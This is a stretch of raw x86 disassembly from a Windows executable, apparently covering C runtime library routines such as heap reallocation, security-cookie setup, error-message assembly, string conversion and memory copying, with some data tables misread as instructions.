  404e6c:	lea    esi,[eax+esi*1+0x4]
  404e70:	mov    al,BYTE PTR [esi]
  404e72:	test   al,0x40
  404e74:	jne    0x404e7a
  404e76:	or     al,0x2
  404e78:	mov    BYTE PTR [esi],al
  404e7a:	sub    edi,DWORD PTR [ebp+0xc]
  404e7d:	mov    DWORD PTR [ebp-0xc],edi
  404e80:	mov    eax,DWORD PTR [ebp-0xc]
  404e83:	jmp    0x404e99
  404e85:	and    DWORD PTR ds:0x4287d0,0x0
  404e8c:	mov    DWORD PTR ds:0x4287cc,0x9
  404e96:	or     eax,0xffffffff
  404e99:	pop    edi
  404e9a:	pop    esi
  404e9b:	pop    ebx
  404e9c:	leave  
  404e9d:	ret    
  404e9e:	inc    DWORD PTR ds:0x428980
  404ea4:	push   0x1000
  404ea9:	call   0x4034f2
  404eae:	test   eax,eax
  404eb0:	pop    ecx
  404eb1:	mov    ecx,DWORD PTR [esp+0x4]
  404eb5:	mov    DWORD PTR [ecx+0x8],eax
  404eb8:	je     0x404ec7
  404eba:	or     DWORD PTR [ecx+0xc],0x8
  404ebe:	mov    DWORD PTR [ecx+0x18],0x1000
  404ec5:	jmp    0x404ed8
  404ec7:	or     DWORD PTR [ecx+0xc],0x4
  404ecb:	lea    eax,[ecx+0x14]
  404ece:	mov    DWORD PTR [ecx+0x8],eax
  404ed1:	mov    DWORD PTR [ecx+0x18],0x2
  404ed8:	mov    eax,DWORD PTR [ecx+0x8]
  404edb:	and    DWORD PTR [ecx+0x4],0x0
  404edf:	mov    DWORD PTR [ecx],eax
  404ee1:	ret    
  404ee2:	mov    eax,ds:0x428970
  404ee7:	test   eax,eax
  404ee9:	je     0x404efa
  404eeb:	push   DWORD PTR [esp+0x4]
  404eef:	call   eax
  404ef1:	test   eax,eax
  404ef3:	pop    ecx
  404ef4:	je     0x404efa
  404ef6:	xor    eax,eax
  404ef8:	inc    eax
  404ef9:	ret    
  404efa:	xor    eax,eax
  404efc:	ret    
  404efd:	push   0x2
  404eff:	call   0x40170d
  404f04:	pop    ecx
  404f05:	ret    
  404f06:	push   ebp
  404f07:	mov    ebp,esp
  404f09:	sub    esp,0x10
  404f0c:	push   esi
  404f0d:	lea    eax,[ebp-0x8]
  404f10:	push   eax
  404f11:	call   DWORD PTR ds:0x4260d8
  404f17:	mov    esi,DWORD PTR [ebp-0x4]
  404f1a:	xor    esi,DWORD PTR [ebp-0x8]
  404f1d:	call   DWORD PTR ds:0x4260d4
  404f23:	xor    esi,eax
  404f25:	call   DWORD PTR ds:0x4260d0
  404f2b:	xor    esi,eax
  404f2d:	call   DWORD PTR ds:0x426000
  404f33:	xor    esi,eax
  404f35:	lea    eax,[ebp-0x10]
  404f38:	push   eax
  404f39:	call   DWORD PTR ds:0x4260cc
  404f3f:	mov    eax,DWORD PTR [ebp-0xc]
  404f42:	xor    eax,DWORD PTR [ebp-0x10]
  404f45:	xor    esi,eax
  404f47:	mov    DWORD PTR ds:0x4282a8,esi
  404f4d:	jne    0x404f59
  404f4f:	mov    DWORD PTR ds:0x4282a8,0xbb40e64e
  404f59:	pop    esi
  404f5a:	leave  
  404f5b:	ret    
  404f5c:	push   0x118
  404f61:	push   0x426b30
  404f66:	call   0x4030a4
  404f6b:	mov    eax,ds:0x4282a8
  404f70:	xor    eax,DWORD PTR [ebp+0x4]
  404f73:	mov    DWORD PTR [ebp-0x1c],eax
  404f76:	mov    eax,ds:0x428978
  404f7b:	xor    ecx,ecx
  404f7d:	cmp    eax,ecx
  404f7f:	je     0x404fa0
  404f81:	mov    DWORD PTR [ebp-0x4],ecx
  404f84:	push   DWORD PTR [ebp+0xc]
  404f87:	push   DWORD PTR [ebp+0x8]
  404f8a:	call   eax
  404f8c:	pop    ecx
  404f8d:	pop    ecx
  404f8e:	or     DWORD PTR [ebp-0x4],0xffffffff
  404f92:	jmp    0x40509e
  404f97:	xor    eax,eax
  404f99:	inc    eax
  404f9a:	ret    
  404f9b:	mov    esp,DWORD PTR [ebp-0x18]
  404f9e:	jmp    0x404f8e
  404fa0:	mov    eax,DWORD PTR [ebp+0x8]
  404fa3:	dec    eax
  404fa4:	je     0x404fb9
  404fa6:	mov    edi,0x426b0c
  404fab:	mov    DWORD PTR [ebp-0x20],0x426a58
  404fb2:	mov    esi,0xd4
  404fb7:	jmp    0x404fca
  404fb9:	mov    edi,0x426a38
  404fbe:	mov    DWORD PTR [ebp-0x20],0x426998
  404fc5:	mov    esi,0xb9
  404fca:	mov    BYTE PTR [ebp-0x24],cl
  404fcd:	push   0x104
  404fd2:	lea    eax,[ebp-0x128]
  404fd8:	push   eax
  404fd9:	push   ecx
  404fda:	call   DWORD PTR ds:0x42606c
  404fe0:	test   eax,eax
  404fe2:	jne    0x404ff7
  404fe4:	push   0x4264b4
  404fe9:	lea    eax,[ebp-0x128]
  404fef:	push   eax
  404ff0:	call   0x403810
  404ff5:	pop    ecx
  404ff6:	pop    ecx
  404ff7:	lea    ebx,[ebp-0x128]
  404ffd:	lea    eax,[ebp-0x128]
  405003:	push   eax
  405004:	call   0x403a40
  405009:	pop    ecx
  40500a:	add    eax,0xb
  40500d:	cmp    eax,0x3c
  405010:	jbe    0x40503b
  405012:	lea    eax,[ebp-0x128]
  405018:	push   eax
  405019:	call   0x403a40
  40501e:	mov    ebx,eax
  405020:	lea    eax,[ebp-0x128]
  405026:	sub    eax,0x31
  405029:	add    ebx,eax
  40502b:	push   0x3
  40502d:	push   0x4264b0
  405032:	push   ebx
  405033:	call   0x403910
  405038:	add    esp,0x10
  40503b:	push   ebx
  40503c:	call   0x403a40
  405041:	pop    ecx
  405042:	lea    eax,[eax+esi*1+0xc]
  405046:	add    eax,0x3
  405049:	and    eax,0xfffffffc
  40504c:	call   0x4030f0
  405051:	mov    DWORD PTR [ebp-0x18],esp
  405054:	mov    esi,esp
  405056:	push   edi
  405057:	push   esi
  405058:	call   0x403810
  40505d:	mov    edi,0x426490
  405062:	push   edi
  405063:	push   esi
  405064:	call   0x403820
  405069:	push   0x42698c
  40506e:	push   esi
  40506f:	call   0x403820
  405074:	push   ebx
  405075:	push   esi
  405076:	call   0x403820
  40507b:	push   edi
  40507c:	push   esi
  40507d:	call   0x403820
  405082:	push   DWORD PTR [ebp-0x20]
  405085:	push   esi
  405086:	call   0x403820
  40508b:	push   0x12010
  405090:	push   0x426468
  405095:	push   esi
  405096:	call   0x403710
  40509b:	add    esp,0x3c
  40509e:	push   0x3
  4050a0:	call   0x402655
  4050a5:	int3   
  4050a6:	push   ebx
  4050a7:	mov    ebx,DWORD PTR [esp+0x8]
  4050ab:	test   ebx,ebx
  4050ad:	push   ebp
  4050ae:	push   edi
  4050af:	jne    0x4050c0
  4050b1:	push   DWORD PTR [esp+0x14]
  4050b5:	call   0x4034f2
  4050ba:	pop    ecx
  4050bb:	jmp    0x405204
  4050c0:	push   esi
  4050c1:	mov    esi,DWORD PTR [esp+0x18]
  4050c5:	test   esi,esi
  4050c7:	jne    0x4050d5
  4050c9:	push   ebx
  4050ca:	call   0x40331e
  4050cf:	pop    ecx
  4050d0:	jmp    0x405201
  4050d5:	cmp    DWORD PTR ds:0x429c04,0x3
  4050dc:	jne    0x4051cd
  4050e2:	xor    edi,edi
  4050e4:	cmp    esi,0xffffffe0
  4050e7:	ja     0x4051af
  4050ed:	push   ebx
  4050ee:	call   0x403f49
  4050f3:	mov    ebp,eax
  4050f5:	test   ebp,ebp
  4050f7:	pop    ecx
  4050f8:	je     0x40518e
  4050fe:	cmp    esi,DWORD PTR ds:0x4299b0
  405104:	ja     0x40514e
  405106:	push   esi
  405107:	push   ebx
  405108:	push   ebp
  405109:	call   0x404449
  40510e:	add    esp,0xc
  405111:	test   eax,eax
  405113:	je     0x405119
  405115:	mov    edi,ebx
  405117:	jmp    0x40514a
  405119:	push   esi
  40511a:	call   0x404728
  40511f:	mov    edi,eax
  405121:	test   edi,edi
  405123:	pop    ecx
  405124:	je     0x40514e
  405126:	mov    eax,DWORD PTR [ebx-0x4]
  405129:	dec    eax
  40512a:	cmp    eax,esi
  40512c:	jb     0x405130
  40512e:	mov    eax,esi
  405130:	push   eax
  405131:	push   ebx
  405132:	push   edi
  405133:	call   0x4013d0
  405138:	push   ebx
  405139:	call   0x403f49
  40513e:	mov    ebp,eax
  405140:	push   ebx
  405141:	push   ebp
  405142:	call   0x403f74
  405147:	add    esp,0x18
  40514a:	test   edi,edi
  40514c:	jne    0x40518a
  40514e:	test   esi,esi
  405150:	jne    0x405153
  405152:	inc    esi
  405153:	add    esi,0xf
  405156:	and    esi,0xfffffff0
  405159:	push   esi
  40515a:	push   0x0
  40515c:	push   DWORD PTR ds:0x429c00
  405162:	call   DWORD PTR ds:0x4260a0
  405168:	mov    edi,eax
  40516a:	test   edi,edi
  40516c:	je     0x40518a
  40516e:	mov    eax,DWORD PTR [ebx-0x4]
  405171:	dec    eax
  405172:	cmp    eax,esi
  405174:	jb     0x405178
  405176:	mov    eax,esi
  405178:	push   eax
  405179:	push   ebx
  40517a:	push   edi
  40517b:	call   0x4013d0
  405180:	push   ebx
  405181:	push   ebp
  405182:	call   0x403f74
  405187:	add    esp,0x14
  40518a:	test   ebp,ebp
  40518c:	jne    0x4051ab
  40518e:	test   esi,esi
  405190:	jne    0x405193
  405192:	inc    esi
  405193:	add    esi,0xf
  405196:	and    esi,0xfffffff0
  405199:	push   esi
  40519a:	push   ebx
  40519b:	push   0x0
  40519d:	push   DWORD PTR ds:0x429c00
  4051a3:	call   DWORD PTR ds:0x4260c0
  4051a9:	mov    edi,eax
  4051ab:	test   edi,edi
  4051ad:	jne    0x4051c9
  4051af:	cmp    DWORD PTR ds:0x428974,0x0
  4051b6:	je     0x4051c9
  4051b8:	push   esi
  4051b9:	call   0x404ee2
  4051be:	test   eax,eax
  4051c0:	pop    ecx
  4051c1:	jne    0x4050e2
  4051c7:	jmp    0x405201
  4051c9:	mov    eax,edi
  4051cb:	jmp    0x405203
  4051cd:	xor    eax,eax
  4051cf:	cmp    esi,0xffffffe0
  4051d2:	ja     0x4051ed
  4051d4:	test   esi,esi
  4051d6:	jne    0x4051d9
  4051d8:	inc    esi
  4051d9:	push   esi
  4051da:	push   ebx
  4051db:	push   0x0
  4051dd:	push   DWORD PTR ds:0x429c00
  4051e3:	call   DWORD PTR ds:0x4260c0
  4051e9:	test   eax,eax
  4051eb:	jne    0x405203
  4051ed:	cmp    DWORD PTR ds:0x428974,0x0
  4051f4:	je     0x405203
  4051f6:	push   esi
  4051f7:	call   0x404ee2
  4051fc:	test   eax,eax
  4051fe:	pop    ecx
  4051ff:	jne    0x4051cd
  405201:	xor    eax,eax
  405203:	pop    esi
  405204:	pop    edi
  405205:	pop    ebp
  405206:	pop    ebx
  405207:	ret    
  405208:	cmp    DWORD PTR ds:0x429c04,0x3
  40520f:	push   esi
  405210:	jne    0x40522c
  405212:	mov    esi,DWORD PTR [esp+0x8]
  405216:	push   esi
  405217:	call   0x403f49
  40521c:	test   eax,eax
  40521e:	pop    ecx
  40521f:	je     0x405229
  405221:	mov    eax,DWORD PTR [esi-0x4]
  405224:	sub    eax,0x9
  405227:	pop    esi
  405228:	ret    
  405229:	push   esi
  40522a:	jmp    0x405230
  40522c:	push   DWORD PTR [esp+0x8]
  405230:	push   0x0
  405232:	push   DWORD PTR ds:0x429c00
  405238:	call   DWORD PTR ds:0x4260dc
  40523e:	pop    esi
  40523f:	ret    
  405240:	push   0x38
  405242:	push   0x426b40
  405247:	call   0x4030a4
  40524c:	xor    ebx,ebx
  40524e:	cmp    DWORD PTR ds:0x42897c,ebx
  405254:	jne    0x40528e
  405256:	push   ebx
  405257:	push   ebx
  405258:	xor    esi,esi
  40525a:	inc    esi
  40525b:	push   esi
  40525c:	push   0x42697c
  405261:	push   0x100
  405266:	push   ebx
  405267:	call   DWORD PTR ds:0x426044
  40526d:	test   eax,eax
  40526f:	je     0x405279
  405271:	mov    DWORD PTR ds:0x42897c,esi
  405277:	jmp    0x40528e
  405279:	call   DWORD PTR ds:0x426018
  40527f:	cmp    eax,0x78
  405282:	jne    0x40528e
  405284:	mov    DWORD PTR ds:0x42897c,0x2
  40528e:	cmp    DWORD PTR [ebp+0x14],ebx
  405291:	jle    0x4052ae
  405293:	mov    ecx,DWORD PTR [ebp+0x14]
  405296:	mov    eax,DWORD PTR [ebp+0x10]
  405299:	dec    ecx
  40529a:	cmp    BYTE PTR [eax],bl
  40529c:	je     0x4052a6
  40529e:	inc    eax
  40529f:	cmp    ecx,ebx
  4052a1:	jne    0x405299
  4052a3:	or     ecx,0xffffffff
  4052a6:	or     eax,0xffffffff
  4052a9:	sub    eax,ecx
  4052ab:	add    DWORD PTR [ebp+0x14],eax
  4052ae:	mov    eax,ds:0x42897c
  4052b3:	cmp    eax,0x2
  4052b6:	je     0x405498
  4052bc:	cmp    eax,ebx
  4052be:	je     0x405498
  4052c4:	cmp    eax,0x1
  4052c7:	jne    0x4054cb
  4052cd:	xor    edi,edi
  4052cf:	mov    DWORD PTR [ebp-0x1c],edi
  4052d2:	mov    DWORD PTR [ebp-0x20],ebx
  4052d5:	mov    DWORD PTR [ebp-0x24],ebx
  4052d8:	cmp    DWORD PTR [ebp+0x20],ebx
  4052db:	jne    0x4052e5
  4052dd:	mov    eax,ds:0x428968
  4052e2:	mov    DWORD PTR [ebp+0x20],eax
  4052e5:	push   ebx
  4052e6:	push   ebx
  4052e7:	push   DWORD PTR [ebp+0x14]
  4052ea:	push   DWORD PTR [ebp+0x10]
  4052ed:	xor    eax,eax
  4052ef:	cmp    DWORD PTR [ebp+0x24],ebx
  4052f2:	setne  al
  4052f5:	lea    eax,[eax*8+0x1]
  4052fc:	push   eax
  4052fd:	push   DWORD PTR [ebp+0x20]
  405300:	call   DWORD PTR ds:0x42609c
  405306:	mov    esi,eax
  405308:	mov    DWORD PTR [ebp-0x28],esi
  40530b:	cmp    esi,ebx
  40530d:	je     0x4054cb
  405313:	mov    DWORD PTR [ebp-0x4],0x1
  40531a:	lea    eax,[esi+esi*1]
  40531d:	add    eax,0x3
  405320:	and    eax,0xfffffffc
  405323:	call   0x4030f0
  405328:	mov    DWORD PTR [ebp-0x18],esp
  40532b:	mov    eax,esp
  40532d:	mov    DWORD PTR [ebp-0x2c],eax
  405330:	or     DWORD PTR [ebp-0x4],0xffffffff
  405334:	jmp    0x405351
  405336:	xor    eax,eax
  405338:	inc    eax
  405339:	ret    
  40533a:	mov    esp,DWORD PTR [ebp-0x18]
  40533d:	call   0x403504
  405342:	xor    ebx,ebx
  405344:	mov    DWORD PTR [ebp-0x2c],ebx
  405347:	or     DWORD PTR [ebp-0x4],0xffffffff
  40534b:	mov    edi,DWORD PTR [ebp-0x1c]
  40534e:	mov    esi,DWORD PTR [ebp-0x28]
  405351:	cmp    DWORD PTR [ebp-0x2c],ebx
  405354:	jne    0x405372
  405356:	lea    eax,[esi+esi*1]
  405359:	push   eax
  40535a:	call   0x4034f2
  40535f:	pop    ecx
  405360:	mov    DWORD PTR [ebp-0x2c],eax
  405363:	cmp    eax,ebx
  405365:	je     0x4054cb
  40536b:	mov    DWORD PTR [ebp-0x20],0x1
  405372:	push   esi
  405373:	push   DWORD PTR [ebp-0x2c]
  405376:	push   DWORD PTR [ebp+0x14]
  405379:	push   DWORD PTR [ebp+0x10]
  40537c:	push   0x1
  40537e:	push   DWORD PTR [ebp+0x20]
  405381:	call   DWORD PTR ds:0x42609c
  405387:	test   eax,eax
  405389:	je     0x405475
  40538f:	push   ebx
  405390:	push   ebx
  405391:	push   esi
  405392:	push   DWORD PTR [ebp-0x2c]
  405395:	push   DWORD PTR [ebp+0xc]
  405398:	push   DWORD PTR [ebp+0x8]
  40539b:	call   DWORD PTR ds:0x426044
  4053a1:	mov    edi,eax
  4053a3:	mov    DWORD PTR [ebp-0x1c],edi
  4053a6:	cmp    edi,ebx
  4053a8:	je     0x405475
  4053ae:	test   BYTE PTR [ebp+0xd],0x4
  4053b2:	je     0x4053e1
  4053b4:	cmp    DWORD PTR [ebp+0x1c],ebx
  4053b7:	je     0x405475
  4053bd:	cmp    edi,DWORD PTR [ebp+0x1c]
  4053c0:	jg     0x405475
  4053c6:	push   DWORD PTR [ebp+0x1c]
  4053c9:	push   DWORD PTR [ebp+0x18]
  4053cc:	push   esi
  4053cd:	push   DWORD PTR [ebp-0x2c]
  4053d0:	push   DWORD PTR [ebp+0xc]
  4053d3:	push   DWORD PTR [ebp+0x8]
  4053d6:	call   DWORD PTR ds:0x426044
  4053dc:	jmp    0x405475
  4053e1:	mov    DWORD PTR [ebp-0x4],0x2
  4053e8:	lea    eax,[edi+edi*1]
  4053eb:	add    eax,0x3
  4053ee:	and    eax,0xfffffffc
  4053f1:	call   0x4030f0
  4053f6:	mov    DWORD PTR [ebp-0x18],esp
  4053f9:	mov    eax,esp
  4053fb:	mov    DWORD PTR [ebp-0x30],eax
  4053fe:	or     DWORD PTR [ebp-0x4],0xffffffff
  405402:	jmp    0x40541f
  405404:	xor    eax,eax
  405406:	inc    eax
  405407:	ret    
  405408:	mov    esp,DWORD PTR [ebp-0x18]
  40540b:	call   0x403504
  405410:	xor    ebx,ebx
  405412:	mov    DWORD PTR [ebp-0x30],ebx
  405415:	or     DWORD PTR [ebp-0x4],0xffffffff
  405419:	mov    edi,DWORD PTR [ebp-0x1c]
  40541c:	mov    esi,DWORD PTR [ebp-0x28]
  40541f:	cmp    DWORD PTR [ebp-0x30],ebx
  405422:	jne    0x40543c
  405424:	lea    eax,[edi+edi*1]
  405427:	push   eax
  405428:	call   0x4034f2
  40542d:	pop    ecx
  40542e:	mov    DWORD PTR [ebp-0x30],eax
  405431:	cmp    eax,ebx
  405433:	je     0x405475
  405435:	mov    DWORD PTR [ebp-0x24],0x1
  40543c:	push   edi
  40543d:	push   DWORD PTR [ebp-0x30]
  405440:	push   esi
  405441:	push   DWORD PTR [ebp-0x2c]
  405444:	push   DWORD PTR [ebp+0xc]
  405447:	push   DWORD PTR [ebp+0x8]
  40544a:	call   DWORD PTR ds:0x426044
  405450:	test   eax,eax
  405452:	je     0x405475
  405454:	push   ebx
  405455:	push   ebx
  405456:	cmp    DWORD PTR [ebp+0x1c],ebx
  405459:	jne    0x40545f
  40545b:	push   ebx
  40545c:	push   ebx
  40545d:	jmp    0x405465
  40545f:	push   DWORD PTR [ebp+0x1c]
  405462:	push   DWORD PTR [ebp+0x18]
  405465:	push   edi
  405466:	push   DWORD PTR [ebp-0x30]
  405469:	push   ebx
  40546a:	push   DWORD PTR [ebp+0x20]
  40546d:	call   DWORD PTR ds:0x426080
  405473:	mov    edi,eax
  405475:	cmp    DWORD PTR [ebp-0x24],ebx
  405478:	je     0x405483
  40547a:	push   DWORD PTR [ebp-0x30]
  40547d:	call   0x40331e
  405482:	pop    ecx
  405483:	cmp    DWORD PTR [ebp-0x20],ebx
  405486:	je     0x405491
  405488:	push   DWORD PTR [ebp-0x2c]
  40548b:	call   0x40331e
  405490:	pop    ecx
  405491:	mov    eax,edi
  405493:	jmp    0x4055f3
  405498:	mov    DWORD PTR [ebp-0x34],ebx
  40549b:	xor    edi,edi
  40549d:	mov    DWORD PTR [ebp-0x38],ebx
  4054a0:	cmp    DWORD PTR [ebp+0x8],ebx
  4054a3:	jne    0x4054ad
  4054a5:	mov    eax,ds:0x428958
  4054aa:	mov    DWORD PTR [ebp+0x8],eax
  4054ad:	cmp    DWORD PTR [ebp+0x20],ebx
  4054b0:	jne    0x4054ba
  4054b2:	mov    eax,ds:0x428968
  4054b7:	mov    DWORD PTR [ebp+0x20],eax
  4054ba:	push   DWORD PTR [ebp+0x8]
  4054bd:	call   0x405a2e
  4054c2:	pop    ecx
  4054c3:	mov    DWORD PTR [ebp-0x3c],eax
  4054c6:	cmp    eax,0xffffffff
  4054c9:	jne    0x4054d2
  4054cb:	xor    eax,eax
  4054cd:	jmp    0x4055f3
  4054d2:	cmp    eax,DWORD PTR [ebp+0x20]
  4054d5:	je     0x4055c9
  4054db:	push   ebx
  4054dc:	push   ebx
  4054dd:	lea    ecx,[ebp+0x14]
  4054e0:	push   ecx
  4054e1:	push   DWORD PTR [ebp+0x10]
  4054e4:	push   eax
  4054e5:	push   DWORD PTR [ebp+0x20]
  4054e8:	call   0x405a77
  4054ed:	add    esp,0x18
  4054f0:	mov    DWORD PTR [ebp-0x34],eax
  4054f3:	cmp    eax,ebx
  4054f5:	je     0x4054cb
  4054f7:	push   ebx
  4054f8:	push   ebx
  4054f9:	push   DWORD PTR [ebp+0x14]
  4054fc:	push   eax
  4054fd:	push   DWORD PTR [ebp+0xc]
  405500:	push   DWORD PTR [ebp+0x8]
  405503:	call   DWORD PTR ds:0x426048
  405509:	mov    esi,eax
  40550b:	mov    DWORD PTR [ebp-0x40],esi
  40550e:	cmp    esi,ebx
  405510:	je     0x4055b8
  405516:	mov    DWORD PTR [ebp-0x4],ebx
  405519:	add    eax,0x3
  40551c:	and    eax,0xfffffffc
  40551f:	call   0x4030f0
  405524:	mov    DWORD PTR [ebp-0x18],esp
  405527:	mov    edi,esp
  405529:	mov    DWORD PTR [ebp-0x44],edi
  40552c:	push   esi
  40552d:	push   ebx
  40552e:	push   edi
  40552f:	call   0x403420
  405534:	add    esp,0xc
  405537:	jmp    0x405549
  405539:	xor    eax,eax
  40553b:	inc    eax
  40553c:	ret    
  40553d:	mov    esp,DWORD PTR [ebp-0x18]
  405540:	call   0x403504
  405545:	xor    ebx,ebx
  405547:	xor    edi,edi
  405549:	or     DWORD PTR [ebp-0x4],0xffffffff
  40554d:	cmp    edi,ebx
  40554f:	jne    0x405574
  405551:	push   DWORD PTR [ebp-0x40]
  405554:	call   0x4034f2
  405559:	pop    ecx
  40555a:	mov    edi,eax
  40555c:	cmp    edi,ebx
  40555e:	je     0x405591
  405560:	push   DWORD PTR [ebp-0x40]
  405563:	push   ebx
  405564:	push   edi
  405565:	call   0x403420
  40556a:	add    esp,0xc
  40556d:	mov    DWORD PTR [ebp-0x38],0x1
  405574:	push   DWORD PTR [ebp-0x40]
  405577:	push   edi
  405578:	push   DWORD PTR [ebp+0x14]
  40557b:	push   DWORD PTR [ebp-0x34]
  40557e:	push   DWORD PTR [ebp+0xc]
  405581:	push   DWORD PTR [ebp+0x8]
  405584:	call   DWORD PTR ds:0x426048
  40558a:	mov    DWORD PTR [ebp-0x40],eax
  40558d:	cmp    eax,ebx
  40558f:	jne    0x405595
  405591:	xor    esi,esi
  405593:	jmp    0x4055bb
  405595:	push   DWORD PTR [ebp+0x1c]
  405598:	push   DWORD PTR [ebp+0x18]
  40559b:	lea    eax,[ebp-0x40]
  40559e:	push   eax
  40559f:	push   edi
  4055a0:	push   DWORD PTR [ebp+0x20]
  4055a3:	push   DWORD PTR [ebp-0x3c]
  4055a6:	call   0x405a77
  4055ab:	add    esp,0x18
  4055ae:	mov    esi,eax
  4055b0:	neg    esi
  4055b2:	sbb    esi,esi
  4055b4:	neg    esi
  4055b6:	jmp    0x4055bb
  4055b8:	mov    esi,DWORD PTR [ebp-0x48]
  4055bb:	cmp    DWORD PTR [ebp-0x38],ebx
  4055be:	je     0x4055e3
  4055c0:	push   edi
  4055c1:	call   0x40331e
  4055c6:	pop    ecx
  4055c7:	jmp    0x4055e3
  4055c9:	push   DWORD PTR [ebp+0x1c]
  4055cc:	push   DWORD PTR [ebp+0x18]
  4055cf:	push   DWORD PTR [ebp+0x14]
  4055d2:	push   DWORD PTR [ebp+0x10]
  4055d5:	push   DWORD PTR [ebp+0xc]
  4055d8:	push   DWORD PTR [ebp+0x8]
  4055db:	call   DWORD PTR ds:0x426048
  4055e1:	mov    esi,eax
  4055e3:	cmp    DWORD PTR [ebp-0x34],ebx
  4055e6:	je     0x4055f1
  4055e8:	push   DWORD PTR [ebp-0x34]
  4055eb:	call   0x40331e
  4055f0:	pop    ecx
  4055f1:	mov    eax,esi
  4055f3:	lea    esp,[ebp-0x54]
  4055f6:	call   0x4030df
  4055fb:	ret    
  4055fc:	int3   
  4055fd:	int3   
  4055fe:	int3   
  4055ff:	int3   
  405600:	push   ebp
  405601:	mov    ebp,esp
  405603:	push   edi
  405604:	push   esi
  405605:	mov    esi,DWORD PTR [ebp+0xc]
  405608:	mov    ecx,DWORD PTR [ebp+0x10]
  40560b:	mov    edi,DWORD PTR [ebp+0x8]
  40560e:	mov    eax,ecx
  405610:	mov    edx,ecx
  405612:	add    eax,esi
  405614:	cmp    edi,esi
  405616:	jbe    0x405620
  405618:	cmp    edi,eax
  40561a:	jb     0x40579c
  405620:	test   edi,0x3
  405626:	jne    0x40563c
  405628:	shr    ecx,0x2
  40562b:	and    edx,0x3
  40562e:	cmp    ecx,0x8
  405631:	jb     0x40565c
  405633:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405635:	jmp    DWORD PTR [edx*4+0x40574c]
  40563c:	mov    eax,edi
  40563e:	mov    edx,0x3
  405643:	sub    ecx,0x4
  405646:	jb     0x405654
  405648:	and    eax,0x3
  40564b:	add    ecx,eax
  40564d:	jmp    DWORD PTR [eax*4+0x405660]
  405654:	jmp    DWORD PTR [ecx*4+0x40575c]
  40565b:	nop
  40565c:	jmp    DWORD PTR [ecx*4+0x4056e0]
  405663:	nop
  405664:	jo     0x4056bc
  405666:	inc    eax
  405667:	add    BYTE PTR [esi+edx*2+0x56c00040],bl
  40566e:	inc    eax
  40566f:	add    BYTE PTR [ebx],ah
  405671:	ror    DWORD PTR [edx-0x75f877fa],1
  405677:	inc    esi
  405678:	add    DWORD PTR [eax+0x468a0147],ecx
  40567e:	add    al,cl
  405680:	jmp    0x287de87
  405685:	add    esi,0x3
  405688:	add    edi,0x3
  40568b:	cmp    ecx,0x8
  40568e:	jb     0x40565c
  405690:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405692:	jmp    DWORD PTR [edx*4+0x40574c]
  405699:	lea    ecx,[ecx+0x0]
  40569c:	and    edx,ecx
  40569e:	mov    al,BYTE PTR [esi]
  4056a0:	mov    BYTE PTR [edi],al
  4056a2:	mov    al,BYTE PTR [esi+0x1]
  4056a5:	shr    ecx,0x2
  4056a8:	mov    BYTE PTR [edi+0x1],al
  4056ab:	add    esi,0x2
  4056ae:	add    edi,0x2
  4056b1:	cmp    ecx,0x8
  4056b4:	jb     0x40565c
  4056b6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056b8:	jmp    DWORD PTR [edx*4+0x40574c]
  4056bf:	nop
  4056c0:	and    edx,ecx
  4056c2:	mov    al,BYTE PTR [esi]
  4056c4:	mov    BYTE PTR [edi],al
  4056c6:	add    esi,0x1
  4056c9:	shr    ecx,0x2
  4056cc:	add    edi,0x1
  4056cf:	cmp    ecx,0x8
  4056d2:	jb     0x40565c
  4056d4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d6:	jmp    DWORD PTR [edx*4+0x40574c]
  4056dd:	lea    ecx,[ecx+0x0]
  4056e0:	inc    ebx
  4056e1:	push   edi
  4056e2:	inc    eax
  4056e3:	add    BYTE PTR [eax],dh
  4056e5:	push   edi
  4056e6:	inc    eax
  4056e7:	add    BYTE PTR [eax],ch
  4056e9:	push   edi
  4056ea:	inc    eax
  4056eb:	add    BYTE PTR [eax],ah
  4056ed:	push   edi
  4056ee:	inc    eax
  4056ef:	add    BYTE PTR [eax],bl
  4056f1:	push   edi
  4056f2:	inc    eax
  4056f3:	add    BYTE PTR [eax],dl
  4056f5:	push   edi
  4056f6:	inc    eax
  4056f7:	add    BYTE PTR [eax],cl
  4056f9:	push   edi
  4056fa:	inc    eax
  4056fb:	add    BYTE PTR [eax],al
  4056fd:	push   edi
  4056fe:	inc    eax
  4056ff:	add    BYTE PTR [ebx-0x761b71bc],cl
  405705:	inc    esp
  405706:	(bad)  
  405707:	in     al,0x8b
  405709:	inc    esp
  40570a:	mov    gs,eax
  40570c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  405710:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  405714:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  405718:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  40571c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  405720:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  405724:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  405728:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  40572c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  405730:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  405734:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  405738:	lea    eax,[ecx*4+0x0]
  40573f:	add    esi,eax
  405741:	add    edi,eax
  405743:	jmp    DWORD PTR [edx*4+0x40574c]
  40574a:	mov    edi,edi
  40574c:	pop    esp
  40574d:	push   edi
  40574e:	inc    eax
  40574f:	add    BYTE PTR [edi+edx*2+0x40],ah
  405753:	add    BYTE PTR [eax+0x57],dh
  405756:	inc    eax
  405757:	add    BYTE PTR [edi+edx*2+0x458b0040],al
  40575e:	or     BYTE PTR [esi+0x5f],bl
  405761:	leave  
  405762:	ret    
  405763:	nop
  405764:	mov    al,BYTE PTR [esi]
  405766:	mov    BYTE PTR [edi],al
  405768:	mov    eax,DWORD PTR [ebp+0x8]
  40576b:	pop    esi
  40576c:	pop    edi
  40576d:	leave  
  40576e:	ret    
  40576f:	nop
  405770:	mov    al,BYTE PTR [esi]
  405772:	mov    BYTE PTR [edi],al
  405774:	mov    al,BYTE PTR [esi+0x1]
  405777:	mov    BYTE PTR [edi+0x1],al
  40577a:	mov    eax,DWORD PTR [ebp+0x8]
  40577d:	pop    esi
  40577e:	pop    edi
  40577f:	leave  
  405780:	ret    
  405781:	lea    ecx,[ecx+0x0]
